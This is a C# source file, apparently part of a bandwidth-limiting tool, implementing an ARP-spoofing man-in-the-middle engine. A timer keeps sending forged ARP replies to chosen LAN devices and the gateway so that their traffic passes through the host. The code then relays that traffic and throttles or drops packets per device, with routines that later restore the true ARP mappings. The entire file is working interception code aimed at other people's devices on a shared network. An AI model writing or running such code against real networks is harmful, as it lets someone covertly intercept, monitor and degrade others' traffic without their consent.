using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using PacketDotNet;
using SharpPcap;

namespace AlKatta.Core;

/// <summary>
/// The core man-in-the-middle engine. While running it:
///   • continuously re-poisons each limited device + the gateway (so limits never "expire"),
///   • forwards intercepted traffic between device and gateway,
///   • throttles each direction with a per-device token bucket,
///   • restores correct ARP mappings cleanly when a device is released or on stop.
///
/// Only devices explicitly added here are touched; everything else flows untouched.
/// </summary>
public sealed class ControlEngine : IDisposable
{
    public sealed class Target
    {
        public required PhysicalAddress Mac { get; init; }
        public required IPAddress Ip { get; init; }
        public required uint IpKey { get; init; }
        public volatile bool Enabled;
        public TokenBucket Down = new(0);   // internet -> device
        public TokenBucket Up = new(0);     // device   -> internet
        public long RxBytes;                // downstream bytes forwarded
        public long TxBytes;                // upstream bytes forwarded
    }

    private readonly CaptureHub _hub;
    private readonly NetworkContext _ctx;

    private readonly Dictionary<string, Target> _byMac = new(StringComparer.OrdinalIgnoreCase);
    private readonly Dictionary<uint, Target> _byIp = new();
    private readonly object _gate = new();

    private Timer? _poisonTimer;
    private volatile bool _running;

    public int PoisonIntervalMs { get; set; } = 1500;

    public ControlEngine(CaptureHub hub, NetworkContext ctx)
    {
        _hub = hub;
        _ctx = ctx;
    }

    public bool IsRunning => _running;

    // ---- public control surface -------------------------------------------------

    /// <summary>Add a device to management (or update its limits). kbps 0 = unlimited.</summary>
    public void SetLimit(PhysicalAddress mac, IPAddress ip, int downKbps, int upKbps, bool enabled)
    {
        var key = KeyOf(mac);
        lock (_gate)
        {
            if (!_byMac.TryGetValue(key, out var t))
            {
                t = new Target { Mac = mac, Ip = ip, IpKey = NetworkContext.IpToUint(ip) };
                _byMac[key] = t;
                _byIp[t.IpKey] = t;
            }
            else if (!t.Ip.Equals(ip))
            {
                // device got a new IP — re-key the IP lookup
                _byIp.Remove(t.IpKey);
                var nt = new Target { Mac = mac, Ip = ip, IpKey = NetworkContext.IpToUint(ip) };
                nt.Down = t.Down; nt.Up = t.Up;
                _byMac[key] = nt; _byIp[nt.IpKey] = nt; t = nt;
            }

            t.Down.SetRate(KbpsToBytes(downKbps));
            t.Up.SetRate(KbpsToBytes(upKbps));
            t.Enabled = enabled;
        }

        if (enabled) Start();           // make sure the loop is alive
        else Release(mac);               // disabled -> heal this device now
    }

    /// <summary>Stop managing one device and restore its correct ARP mapping.</summary>
    public void Release(PhysicalAddress mac)
    {
        Target? t;
        lock (_gate)
        {
            if (!_byMac.TryGetValue(KeyOf(mac), out t)) return;
            t.Enabled = false;
        }
        if (t != null) RestoreTarget(t, rounds: 4);
    }

    public bool TryGetCounters(string macKey, out long rx, out long tx)
    {
        lock (_gate)
        {
            if (_byMac.TryGetValue(macKey, out var t)) { rx = t.RxBytes; tx = t.TxBytes; return true; }
        }
        rx = tx = 0; return false;
    }

    public void Start()
    {
        if (_running) return;
        if (_ctx.GatewayMac.Equals(PhysicalAddress.None))
            throw new InvalidOperationException("Gateway MAC unknown — run a scan first.");

        _hub.Open();
        _hub.PacketArrived += OnPacket;
        _poisonTimer = new Timer(_ => PoisonTick(), null, 0, PoisonIntervalMs);
        _running = true;
    }

    public void StopAll()
    {
        if (!_running) return;
        _running = false;
        _poisonTimer?.Dispose();
        _poisonTimer = null;
        _hub.PacketArrived -= OnPacket;

        List<Target> targets;
        lock (_gate) { targets = _byMac.Values.ToList(); foreach (var t in targets) t.Enabled = false; }
        foreach (var t in targets) RestoreTarget(t, rounds: 4);
    }

    // ---- poison loop ------------------------------------------------------------

    private void PoisonTick()
    {
        if (!_running) return;
        List<Target> active;
        lock (_gate) active = _byMac.Values.Where(t => t.Enabled).ToList();
        if (active.Count == 0) return;

        var gwMac = _ctx.GatewayMac;
        var gwIp = _ctx.GatewayIp;

        foreach (var t in active)
        {
            try
            {
                // Tell the device: "the gateway is at MY mac"
                _hub.Send(ArpTools.BuildReply(_ctx.MyMac, gwIp, t.Mac, t.Ip));
                // Tell the gateway: "the device is at MY mac"
                _hub.Send(ArpTools.BuildReply(_ctx.MyMac, t.Ip, gwMac, gwIp));
            }
            catch { /* transient send error; next tick retries */ }
        }
    }

    private void RestoreTarget(Target t, int rounds)
    {
        var gwMac = _ctx.GatewayMac;
        var gwIp = _ctx.GatewayIp;
        if (gwMac.Equals(PhysicalAddress.None)) return;

        for (int i = 0; i < rounds; i++)
        {
            try
            {
                // Re-teach the truth so both sides reconnect directly, fast.
                _hub.Send(ArpTools.BuildReply(gwMac, gwIp, t.Mac, t.Ip));   // device: gateway is really gwMac
                _hub.Send(ArpTools.BuildReply(t.Mac, t.Ip, gwMac, gwIp));   // gateway: device is really tMac
            }
            catch { }
            Thread.Sleep(120);
        }
    }

    // ---- forwarding + throttling ------------------------------------------------

    private void OnPacket(RawCapture raw)
    {
        if (!_running) return;
        if (raw.LinkLayerType != LinkLayers.Ethernet) return;

        EthernetPacket eth;
        IPv4Packet? ip;
        try
        {
            var pkt = Packet.ParsePacket(raw.LinkLayerType, raw.Data);
            eth = (EthernetPacket)pkt;
            ip = pkt.Extract<IPv4Packet>();
        }
        catch { return; }

        if (ip == null) return;

        // Ignore frames we ourselves emitted, and anything not redirected to us.
        if (eth.SourceHardwareAddress.Equals(_ctx.MyMac)) return;
        if (!eth.DestinationHardwareAddress.Equals(_ctx.MyMac)) return;

        uint srcKey = NetworkContext.IpToUint(ip.SourceAddress);
        uint dstKey = NetworkContext.IpToUint(ip.DestinationAddress);
        int len = raw.Data.Length;

        Target? t;
        bool upstream;   // true = device -> internet

        lock (_gate)
        {
            if (_byIp.TryGetValue(srcKey, out t) && t.Enabled) upstream = true;
            else if (_byIp.TryGetValue(dstKey, out t) && t.Enabled) upstream = false;
            else return; // not a managed/enabled device
        }

        var bucket = upstream ? t.Up : t.Down;
        if (!bucket.TryConsume(len)) return; // throttle: drop over-budget packet

        // Rewrite L2 header and relay.
        try
        {
            if (upstream)
            {
                eth.SourceHardwareAddress = _ctx.MyMac;
                eth.DestinationHardwareAddress = _ctx.GatewayMac;
                _hub.Send(eth.Bytes);
                Interlocked.Add(ref t.TxBytes, len);
            }
            else
            {
                eth.SourceHardwareAddress = _ctx.MyMac;
                eth.DestinationHardwareAddress = t.Mac;
                _hub.Send(eth.Bytes);
                Interlocked.Add(ref t.RxBytes, len);
            }
        }
        catch { /* drop on send failure */ }
    }

    // ---- helpers ----------------------------------------------------------------

    private static string KeyOf(PhysicalAddress mac) =>
        string.Join(":", mac.GetAddressBytes().Select(b => b.ToString("X2")));

    private static long KbpsToBytes(int kbps) => kbps <= 0 ? 0 : (long)kbps * 1000 / 8;

    public void Dispose() => StopAll();
}
